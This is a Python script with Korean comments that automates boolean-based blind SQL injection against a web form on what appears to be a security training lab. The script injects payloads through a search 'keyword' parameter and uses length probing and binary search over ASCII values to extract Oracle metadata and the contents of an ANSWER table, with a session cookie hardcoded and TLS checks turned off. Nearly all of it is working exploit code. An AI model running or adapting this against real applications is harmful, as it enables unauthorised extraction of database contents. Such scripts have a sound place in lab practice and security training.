import requests
import urllib3
import time

# InsecureRequestWarning 경고 비활성화
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 요청을 보낼 URL 정의
URL = "https://lab.eqst.co.kr:8442/exam5/free"

# 🚨 중요: 아래 Cookie 값은 실습 시점에 맞는 본인의 JSESSIONID로 꼭 교체해주세요.
HEADERS = {
    "Cookie": "JSESSIONID=2305081D833AC69F5ECBD05E4C9A967B"
}

def test_query(payload):
    """
    [수정됨] 표준 SQL 인젝션 구문으로 페이로드를 전송하는 함수
    """
    params = {
        "page": "1",
        "sorting": "",
        "sortingAd": "",
        "startDt": "",
        "endDt": "",
        "searchType": "all",
        # 'pp'를 닫고, 우리만의 AND 조건을 삽입한 뒤, '--' 주석으로 나머지 쿼리를 무효화
        "keyword": f"pp' AND ({payload}) AND 'j%'='j"
    }
    try:
        response = requests.get(URL, headers=HEADERS, params=params, verify=False, timeout=10)
        # 성공/실패 판단 기준은 '<td class="title">'로 유지
        return '<td class="title">' in response.text
    except requests.exceptions.RequestException as e:
        print(f"오류 발생: {e}")
        return False

def find_length(query):
    """
    주어진 쿼리 결과의 길이를 찾는 함수 (1~30자 가정)
    """
    for length in range(1, 31):
        # (SELECT LENGTH((쿼리)) FROM DUAL) = 길이
        payload = f"(SELECT LENGTH(({query})) FROM DUAL) = {length}"
        print(f"[*] 길이 {length} 확인 중...")
        if test_query(payload):
            print(f"[+] 길이 발견: {length}")
            return length
        time.sleep(0.1)
    print("[-] 길이를 찾지 못했습니다.")
    return 0

def find_data_binary(query, length):
    """
    주어진 쿼리 결과를 이진 탐색으로 찾는 함수
    """
    result = ""
    print("\n--- 데이터 내용 찾는 중 (이진 탐색) ---")
    for i in range(1, length + 1):
        low = 32  # ASCII 코드 시작 (공백)
        high = 126 # ASCII 코드 끝 (~)
        
        while low <= high:
            mid = (low + high) // 2
            # (SELECT ASCII(SUBSTR((쿼리), 글자위치, 1)) FROM DUAL) > 중간값
            payload = f"(SELECT ASCII(SUBSTR(({query}), {i}, 1)) FROM DUAL) > {mid}"
            if test_query(payload):
                low = mid + 1
            else:
                high = mid - 1
            time.sleep(0.1)
        
        found_char = chr(low)
        result += found_char
        print(f"[*] {i}/{length} 번째 글자: '{found_char}'")
    return result

# ===================================================================
# ## 🎯 메인 실행 로직 (목표에 맞게 수정된 부분) ##
# ===================================================================

if __name__ == "__main__":
    print("="*40)
    print("Blind SQL Injection 자동화 스크립트 시작")
    print(f"타겟 URL: {URL}")
    print("="*40)

    # 연결 테스트
    if not test_query("'1'='1'"):
        print("[-] 기본 인젝션 실패. URL, 쿠키 값, 네트워크를 확인하세요.")
        exit()
    print("[+] 기본 인젝션 성공! 공격을 시작합니다.\n")

    # 1단계: ANSWER 테이블의 컬럼명 찾기
    print("--- 1. ANSWER 테이블의 컬럼명 찾기 ---")
    # Oracle 메타데이터를 조회하여 'ANSWER' 테이블의 첫 번째 컬럼명을 가져오는 쿼리
    column_name_query = "SELECT COLUMN_NAME FROM (SELECT ROWNUM RNUM, COLUMN_NAME FROM USER_TAB_COLUMNS WHERE TABLE_NAME = 'ANSWER') WHERE RNUM = 1"
    
    col_len = find_length(column_name_query)
    if col_len > 0:
        column_name = find_data_binary(column_name_query, col_len)
        print(f"\n[+] 찾은 컬럼명: {column_name}\n")
    else:
        exit()

    # 2단계: 찾은 컬럼명을 이용해 실제 정답 데이터 찾기
    print(f"--- 2. '{column_name}' 컬럼의 정답 데이터 찾기 ---")
    # 'ANSWER' 테이블에서 해당 컬럼의 첫 번째 데이터를 가져오는 쿼리
    answer_query = f"SELECT {column_name} FROM ANSWER WHERE ROWNUM = 1"

    answer_len = find_length(answer_query)
    if answer_len > 0:
        final_answer = find_data_binary(answer_query, answer_len)
        print("\n" + "="*40)
        print(f"🎉 최종 정답: {final_answer}")
        print("="*40)